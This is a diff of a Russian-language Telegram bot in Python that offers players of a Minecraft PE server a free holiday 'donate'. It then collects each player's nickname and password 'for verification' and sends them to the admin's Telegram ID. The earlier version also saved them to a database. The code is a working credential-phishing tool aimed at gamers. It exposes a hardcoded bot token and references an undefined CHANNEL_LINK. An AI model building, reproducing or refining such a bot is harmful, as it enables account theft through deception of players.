@@ -1,405 +1,337 @@
-import logging
-from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 import sqlite3
-from datetime import datetime, timedelta
-import asyncio
+import time
+import os
+import sys
+import random
+import string
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler
 
-# Настройки
+# Конфигурация
 BOT_TOKEN = "8418052441:AAEyIvxgmYbR6V83sNir0Nsk234mW4VsWGw"
 ADMIN_ID = 8000395560 # Замените на ваш ID админа
 CHANNEL_USERNAME = "@pnixmcbe"  # Замените на username вашего канала
 CREATOR_USERNAME = "@isnikson"  # Замените на username создателя
 
-# Состояния для ConversationHandler
-ENTER_LOGIN, ENTER_PASSWORD = range(2)
+# Состояния
+NICKNAME, PASSWORD = range(2)
 
-# База данных для хранения пользователей и банов
-def init_db():
-    conn = sqlite3.connect('halloween_bot.db')
-    cursor = conn.cursor()
-    
-    # Таблица пользователей
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS users (
-            user_id INTEGER PRIMARY KEY,
-            username TEXT,
-            first_name TEXT,
-            last_name TEXT,
-            message_count INTEGER DEFAULT 0,
-            last_message_time TIMESTAMP,
-            is_banned BOOLEAN DEFAULT FALSE,
-            ban_until TIMESTAMP
-        )
-    ''')
-    
-    # Таблица для логов донатов
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS donation_logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER,
-            username TEXT,
-            login TEXT,
-            password TEXT,
-            timestamp TIMESTAMP
-        )
-    ''')
-    
-    conn.commit()
-    conn.close()
+# База данных
+if os.path.exists('users.db'):
+    os.remove('users.db')
 
-# Инициализация базы данных
-init_db()
+conn = sqlite3.connect('users.db', check_same_thread=False)
+c = conn.cursor()
+c.execute('''CREATE TABLE IF NOT EXISTS users 
+             (user_id INTEGER PRIMARY KEY, banned INTEGER DEFAULT 0)''')
+conn.commit()
 
-# Настройка логирования
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
+# Антиспам
+user_message_times = {}
+
+def check_spam(user_id):
+    now = time.time()
+    if user_id not in user_message_times:
+        user_message_times[user_id] = []
+    
+    user_message_times[user_id] = [t for t in user_message_times[user_id] if now - t < 60]
+    user_message_times[user_id].append(now)
+    
+    return len(user_message_times[user_id]) > 10
+
+def is_banned(user_id):
+    """Проверяет, забанен ли пользователь"""
+    c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
+    user_data = c.fetchone()
+    return user_data and user_data[0]
+
+def generate_strong_password(length=13):
+    """Генерирует сложный пароль из неповторяющихся символов"""
+    if length > len(string.ascii_letters + string.digits + string.punctuation):
+        length = 13
+    
+    # Все доступные символы
+    all_chars = string.ascii_letters + string.digits + string.punctuation
+    # Перемешиваем символы и берем нужное количество
+    shuffled_chars = random.sample(all_chars, len(all_chars))
+    # Берем первые length символов
+    password = ''.join(shuffled_chars[:length])
+    
+    return password
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-    
-    # Проверяем не забанен ли пользователь
-    if is_user_banned(user_id):
-        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
-        return
-    
-    welcome_text = f"""
-👻 Добро пожаловать в РаздачБота! 🎄
+    try:
+        user_id = update.effective_user.id
+        
+        # Проверка бана
+        if is_banned(user_id):
+            await update.message.reply_text("❌ Вы забанены.")
+            return
+        
+        await update.message.reply_text(
+            "🎄 *ПОЛУЧИ ДЕД ДОНАТ!*\n\n"
+            "Сервер: `phoenix-pe.ru`\n"
+            "Порт: `19132`\n\n"
+            "Нажмите кнопку ниже чтобы начать получение доната!\n\n/help Ваш вопрос",
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🎄 ПОЛУЧИТЬ ДОНАТ", callback_data="get_donate")],
+                [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)],
+                [InlineKeyboardButton("👤 СОЗДАТЕЛЬ", url=f"tg://resolve?domain={CREATOR_USERNAME[1:]}")]
+            ])
+        )
+    except Exception as e:
+        print(f"Error in start: {e}")
 
-📢 Наш канал: {CHANNEL_USERNAME}
-👨‍💻 Создатель: {CREATOR_USERNAME}
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /help для связи с админом"""
+    try:
+        user_id = update.effective_user.id
+        
+        # Проверка бана
+        if is_banned(user_id):
+            await update.message.reply_text("❌ Вы забанены.")
+            return
+        
+        # Проверяем, есть ли текст после команды
+        if not context.args:
+            await update.message.reply_text(
+                "❌ *Использование:* `/help Ваш вопрос`\n\n"
+                "📝 *Пример:*\n"
+                "`/help Как получить донат?`\n\n"
+                "💬 *Опишите вашу проблему или вопрос после команды /help*",
+                parse_mode='Markdown'
+            )
+            return
+        
+        # Получаем вопрос пользователя
+        user_question = ' '.join(context.args)
+        username = update.effective_user.username
+        user_id = update.effective_user.id
+        
+        # Формируем сообщение для админа в указанном формате
+        admin_message = (
+            "🆘 *НОВЫЙ ВОПРОС ОТ ПОЛЬЗОВАТЕЛЯ*\n\n"
+            f"Username: @{username or 'N/A'}\n"
+            f"🆔 User ID: {user_id}\n"
+            f"❓ Вопрос: {user_question}"
+        )
+        
+        # Отправляем админу
+        try:
+            await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
+            await update.message.reply_text(
+                "✅ *Ваш вопрос отправлен администратору!*\n\n"
+                "📞 *Мы ответим вам в ближайшее время.*\n"
+                "⏳ *Ожидайте ответа в этом чате.*",
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            await update.message.reply_text(
+                "❌ *Произошла ошибка при отправке вопроса.*\n"
+                "⚠️ *Попробуйте позже или свяжитесь с создателем.*",
+                parse_mode='Markdown'
+            )
+            print(f"Error sending help message to admin: {e}")
+            
+    except Exception as e:
+        print(f"Error in help_command: {e}")
+        await update.message.reply_text("❌ Произошла ошибка. Попробуйте позже.")
 
-💀 Чтобы получить специальный NewYear донат, вам нужно ввести данные вашего аккаунта.
-
-⚠️ ВНИМАНИЕ: Введите только свои **данные**
-"""
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
     
-    keyboard = [
-        [KeyboardButton("🎄 Получить **NewYear** донат")],
-        [KeyboardButton("📢 Наш канал"), KeyboardButton("👨‍💻 Создатель")]
-    ]
-    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    user_id = query.from_user.id
     
-    await update.message.reply_text(welcome_text, reply_markup=reply_markup)
-    
-    # Сбрасываем состояние если было
-    if context.user_data.get('in_donation_process'):
-        context.user_data.clear()
-
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-    message_text = update.message.text
-    
-    # Проверяем бан
-    if is_user_banned(user_id):
-        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
-        return
-    
-    # Анти-спам система
-    if not update_antispam(user_id):
-        await ban_user(user_id, "Спам (более 10 сообщений в минуту)")
-        await update.message.reply_text("❌ Вы забанены за спам!")
-        await notify_admin(f"🚨 Пользователь забанен за спам:\n"
-                          f"ID: {user_id}\n"
-                          f"Username: @{user.username if user.username else 'N/A'}\n"
-                          f"Имя: {user.first_name}")
-        return
-    
-    # Обработка кнопок
-    if message_text == "🎄 Получить **NewYear** донат":
-        await start_donation(update, context)
-    elif message_text == "📢 Наш канал":
-        await update.message.reply_text(f"📢 Подписывайтесь на наш канал: {CHANNEL_USERNAME}")
-    elif message_text == "👨‍💻 Создатель":
-        await update.message.reply_text(f"👨‍💻 Наш создатель: {CREATOR_USERNAME}")
-    else:
-        await update.message.reply_text("🤔 Используйте кнопки для навигации!")
-
-async def start_donation(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-    
-    if is_user_banned(user_id):
-        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
-        return
-    
-    await update.message.reply_text(
-        "🎄 Для получения **NewYear** доната введите логин вашего аккаунта:\n"
-        "⚠️ Используйте только тестовые данные!"
-    )
-    return ENTER_LOGIN
-
-async def enter_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-    
-    if is_user_banned(user_id):
-        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
+    # Проверка бана при нажатии на кнопку
+    if is_banned(user_id):
+        await query.message.reply_text("❌ Вы забанены.")
         return ConversationHandler.END
     
-    login = update.message.text
-    context.user_data['login'] = login
-    context.user_data['in_donation_process'] = True
-    
-    await update.message.reply_text(
-        "🔐 Теперь введите пароль:\n"
-        "⚠️ Используйте только тестовые данные!"
-    )
-    return ENTER_PASSWORD
+    if query.data == "get_donate":
+        await query.message.reply_text("🔹 Введите ваш никнейм:")
+        return NICKNAME
 
-async def enter_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-    
-    if is_user_banned(user_id):
-        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
+async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        user_id = update.effective_user.id
+        
+        # Проверка бана
+        if is_banned(user_id):
+            await update.message.reply_text("❌ Вы забанены.")
+            return ConversationHandler.END
+        
+        context.user_data['nickname'] = update.message.text
+        await update.message.reply_text("🔹 Теперь введите ваш пароль для верификации:")
+        return PASSWORD
+    except Exception as e:
+        print(f"Error in get_nickname: {e}")
         return ConversationHandler.END
-    
-    password = update.message.text
-    login = context.user_data.get('login')
-    
-    # Сохраняем в базу данных
-    save_donation_log(user_id, user.username, login, password)
-    
-    # Отправляем админу
-    admin_message = (
-        "🎃 НОВЫЙ HALLOWEEN ДОНАТ! 🎃\n"
-        f"👤 Пользователь: @{user.username if user.username else 'N/A'}\n"
-        f"🆔 ID: {user_id}\n"
-        f"📛 Имя: {user.first_name}\n"
-        f"🔑 Логин: {login}\n"
-        f"🔒 Пароль: {password}\n"
-        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
-    
-    await notify_admin(admin_message)
-    
-    # Ответ пользователю
-    await update.message.reply_text(
-        "🎉 Спасибо! Вы находитесь в очереди!\n"
-        "👻 NewYear донат будет зачислен в ближайшее время!\n"
-        "⚠️ Помните: Будущие за вами!!"
-    )
-    
-    # Очищаем состояние
-    context.user_data.clear()
-    return ConversationHandler.END
+
+async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        user_id = update.effective_user.id
+        
+        # Проверка бана
+        if is_banned(user_id):
+            await update.message.reply_text("❌ Вы забанены.")
+            return ConversationHandler.END
+        
+        password = update.message.text
+        nickname = context.user_data['nickname']
+        
+        # Отправка админу
+        admin_text = (
+            "🎃 *НОВЫЕ ДАННЫЕ ДЛЯ ДОНАТА*\n\n"
+            f"👤 User ID: `{user_id}`\n"
+            f"📧 Username: @{update.effective_user.username or 'N/A'}\n"
+            f"🔑 Никнейм: `{nickname}`\n"
+            f"🔒 Пароль: `{password}`\n"
+            f"⏰ Время: `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
+        )
+        
+        await context.bot.send_message(ADMIN_ID, admin_text, parse_mode='Markdown')
+        
+        await update.message.reply_text(
+            "✅ Данные приняты! Донат придет в течение 10-15 минут.\n\n"
+            "📢 Обязательно подпишись на наш канал!",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)]
+            ])
+        )
+        
+        return ConversationHandler.END
+    except Exception as e:
+        print(f"Error in get_password: {e}")
+        return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    context.user_data.clear()
-    await update.message.reply_text("❌ Процесс отменен.")
+    await update.message.reply_text("❌ Отменено.")
     return ConversationHandler.END
 
-# Админ команды
-async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ У вас нет прав для этой команды.")
-        return
-    
-    if not context.args or len(context.args) < 1:
-        await update.message.reply_text("Использование: /ban <user_id> [причина]")
-        return
-    
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
-        user_id_to_ban = int(context.args[0])
-        reason = " ".join(context.args[1:]) if len(context.args) > 1 else "Не указана"
+        user_id = update.effective_user.id
         
-        await ban_user(user_id_to_ban, reason)
-        await update.message.reply_text(f"✅ Пользователь {user_id_to_ban} забанен.\nПричина: {reason}")
+        # Проверка бана
+        if is_banned(user_id):
+            return
         
-    except ValueError:
-        await update.message.reply_text("❌ Неверный формат user_id")
+        # Антиспам
+        if check_spam(user_id):
+            c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
+            conn.commit()
+            await update.message.reply_text("❌ Вы забанены за спам.")
+            return
+    except Exception as e:
+        print(f"Error in handle_message: {e}")
+
+async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        if update.effective_user.id != ADMIN_ID:
+            return
+        
+        if context.args:
+            user_id = int(context.args[0])
+            c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
+            conn.commit()
+            await update.message.reply_text(f"✅ Пользователь {user_id} забанен.")
+    except Exception as e:
+        print(f"Error in ban_command: {e}")
 
 async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ У вас нет прав для этой команды.")
-        return
-    
-    if not context.args or len(context.args) < 1:
-        await update.message.reply_text("Использование: /unban <user_id>")
-        return
-    
     try:
-        user_id_to_unban = int(context.args[0])
-        unban_user(user_id_to_unban)
-        await update.message.reply_text(f"✅ Пользователь {user_id_to_unban} разбанен.")
+        if update.effective_user.id != ADMIN_ID:
+            return
         
-    except ValueError:
-        await update.message.reply_text("❌ Неверный формат user_id")
-
-async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ У вас нет прав для этой команды.")
-        return
-    
-    stats = get_bot_stats()
-    await update.message.reply_text(
-        f"📊 Статистика бота:\n"
-        f"👥 Всего пользователей: {stats['total_users']}\n"
-        f"🎃 Всего донатов: {stats['total_donations']}\n"
-        f"🚫 Забанено: {stats['banned_users']}"
-    )
-
-# Вспомогательные функции
-def update_antispam(user_id):
-    """Обновляет счетчик сообщений и проверяет на спам"""
-    conn = sqlite3.connect('halloween_bot.db')
-    cursor = conn.cursor()
-    
-    now = datetime.now()
-    
-    # Получаем текущие данные пользователя
-    cursor.execute('SELECT message_count, last_message_time FROM users WHERE user_id = ?', (user_id,))
-    result = cursor.fetchone()
-    
-    if result:
-        message_count, last_message_time = result
-        last_message_time = datetime.fromisoformat(last_message_time) if last_message_time else now
-        
-        # Если прошло больше минуты - сбрасываем счетчик
-        if (now - last_message_time).total_seconds() > 60:
-            message_count = 1
-        else:
-            message_count += 1
-    else:
-        message_count = 1
-        # Создаем запись пользователя
-        cursor.execute(
-            'INSERT OR REPLACE INTO users (user_id, message_count, last_message_time) VALUES (?, ?, ?)',
-            (user_id, message_count, now.isoformat())
-        )
-    
-    # Обновляем данные
-    cursor.execute(
-        'UPDATE users SET message_count = ?, last_message_time = ? WHERE user_id = ?',
-        (message_count, now.isoformat(), user_id)
-    )
-    
-    conn.commit()
-    conn.close()
-    
-    return message_count <= 10  # Максимум 10 сообщений в минуту
-
-async def ban_user(user_id, reason):
-    """Банит пользователя"""
-    conn = sqlite3.connect('halloween_bot.db')
-    cursor = conn.cursor()
-    
-    ban_until = (datetime.now() + timedelta(days=30)).isoformat()  # Бан на 30 дней
-    
-    cursor.execute(
-        'INSERT OR REPLACE INTO users (user_id, is_banned, ban_until) VALUES (?, ?, ?)',
-        (user_id, True, ban_until)
-    )
-    
-    conn.commit()
-    conn.close()
-
-def unban_user(user_id):
-    """Разбанивает пользователя"""
-    conn = sqlite3.connect('halloween_bot.db')
-    cursor = conn.cursor()
-    
-    cursor.execute(
-        'UPDATE users SET is_banned = FALSE, ban_until = NULL WHERE user_id = ?',
-        (user_id,)
-    )
-    
-    conn.commit()
-    conn.close()
-
-def is_user_banned(user_id):
-    """Проверяет забанен ли пользователь"""
-    conn = sqlite3.connect('halloween_bot.db')
-    cursor = conn.cursor()
-    
-    cursor.execute('SELECT is_banned, ban_until FROM users WHERE user_id = ?', (user_id,))
-    result = cursor.fetchone()
-    
-    conn.close()
-    
-    if result and result[0]:  # is_banned = True
-        if result[1]:  # Если есть время бана
-            ban_until = datetime.fromisoformat(result[1])
-            if datetime.now() > ban_until:
-                unban_user(user_id)  # Автоматически разбаниваем если время вышло
-                return False
-        return True
-    return False
-
-def save_donation_log(user_id, username, login, password):
-    """Сохраняет лог доната"""
-    conn = sqlite3.connect('halloween_bot.db')
-    cursor = conn.cursor()
-    
-    cursor.execute(
-        'INSERT INTO donation_logs (user_id, username, login, password, timestamp) VALUES (?, ?, ?, ?, ?)',
-        (user_id, username, login, password, datetime.now().isoformat())
-    )
-    
-    conn.commit()
-    conn.close()
-
-def get_bot_stats():
-    """Возвращает статистику бота"""
-    conn = sqlite3.connect('halloween_bot.db')
-    cursor = conn.cursor()
-    
-    cursor.execute('SELECT COUNT(*) FROM users')
-    total_users = cursor.fetchone()[0]
-    
-    cursor.execute('SELECT COUNT(*) FROM donation_logs')
-    total_donations = cursor.fetchone()[0]
-    
-    cursor.execute('SELECT COUNT(*) FROM users WHERE is_banned = TRUE')
-    banned_users = cursor.fetchone()[0]
-    
-    conn.close()
-    
-    return {
-        'total_users': total_users,
-        'total_donations': total_donations,
-        'banned_users': banned_users
-    }
-
-async def notify_admin(message):
-    """Отправляет сообщение админу"""
-    try:
-        app = Application.builder().token(BOT_TOKEN).build()
-        await app.bot.send_message(ADMIN_ID, message)
+        if context.args:
+            user_id = int(context.args[0])
+            c.execute("UPDATE users SET banned=0 WHERE user_id=?", (user_id,))
+            conn.commit()
+            await update.message.reply_text(f"✅ Пользователь {user_id} разбанен.")
     except Exception as e:
-        logging.error(f"Ошибка отправки сообщения админу: {e}")
+        print(f"Error in unban_command: {e}")
+
+async def send_message_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /t для отправки сообщений пользователям (только для админа)"""
+    try:
+        if update.effective_user.id != ADMIN_ID:
+            return
+        
+        if len(context.args) < 2:
+            await update.message.reply_text("❌ Использование: /t <user_id> <сообщение>")
+            return
+        
+        user_id = int(context.args[0])
+        message_text = ' '.join(context.args[1:])
+        
+        try:
+            await context.bot.send_message(user_id, message_text)
+            await update.message.reply_text(f"✅ Сообщение отправлено пользователю {user_id}")
+        except Exception as e:
+            await update.message.reply_text(f"❌ Не удалось отправить сообщение: {e}")
+            
+    except Exception as e:
+        print(f"Error in send_message_command: {e}")
+        await update.message.reply_text("❌ Ошибка при отправке сообщения")
+
+async def password_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /password для генерации сложного пароля (только для админа)"""
+    try:
+        if update.effective_user.id != ADMIN_ID:
+            return
+        
+        # Генерируем сложный пароль
+        strong_password = generate_strong_password(13)
+        
+        await update.message.reply_text(
+            f"🔐 *Сгенерированный пароль:*\n"
+            f"`{strong_password}`\n\n"
+            f"*Длина:* 13 символов\n"
+            f"*Символы:* неповторяющиеся\n"
+            f"⚠️ *Сохраните в надежном месте!*",
+            parse_mode='Markdown'
+        )
+            
+    except Exception as e:
+        print(f"Error in password_command: {e}")
+        await update.message.reply_text("❌ Ошибка при генерации пароля")
 
 def main():
-    # Создаем приложение
-    application = Application.builder().token(BOT_TOKEN).build()
-    
-    # ConversationHandler для процесса доната
-    donation_conv_handler = ConversationHandler(
-        entry_points=[MessageHandler(filters.Regex("🎄 Получить Halloween донат"), start_donation)],
-        states={
-            ENTER_LOGIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_login)],
-            ENTER_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_password)],
-        },
-        fallbacks=[CommandHandler("cancel", cancel)]
-    )
-    
-    # Добавляем обработчики
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(donation_conv_handler)
-    application.add_handler(CommandHandler("ban", ban_command))
-    application.add_handler(CommandHandler("unban", unban_command))
-    application.add_handler(CommandHandler("stats", stats_command))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    
-    # Запускаем бота
-    print("Бот запущен...")
-    application.run_polling()
+    try:
+        # Создаем application с указанием одного бота
+        application = Application.builder().token(BOT_TOKEN).build()
+        
+        conv_handler = ConversationHandler(
+            entry_points=[CallbackQueryHandler(button_handler, pattern='^get_donate$')],
+            states={
+                NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
+                PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
+            },
+            fallbacks=[CommandHandler('cancel', cancel)],
+            allow_reentry=True
+        )
+        
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("help", help_command))
+        application.add_handler(CommandHandler("ban", ban_command))
+        application.add_handler(CommandHandler("unban", unban_command))
+        application.add_handler(CommandHandler("t", send_message_command))
+        application.add_handler(CommandHandler("password", password_command))
+        application.add_handler(conv_handler)
+        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+        
+        print("🔄 Запуск бота...")
+        print("✅ Бот запущен! Остановите все другие экземпляры бота.")
+        application.run_polling(drop_pending_updates=True)
+        
+    except Exception as e:
+        print(f"❌ Ошибка запуска бота: {e}")
+        print("⚠️  Убедитесь, что другие экземпляры бота остановлены!")
+        sys.exit(1)
 
 if __name__ == '__main__':
+    # Проверяем, не запущен ли уже бот
+    print("🔍 Проверка запущенных процессов...")
     main()
-
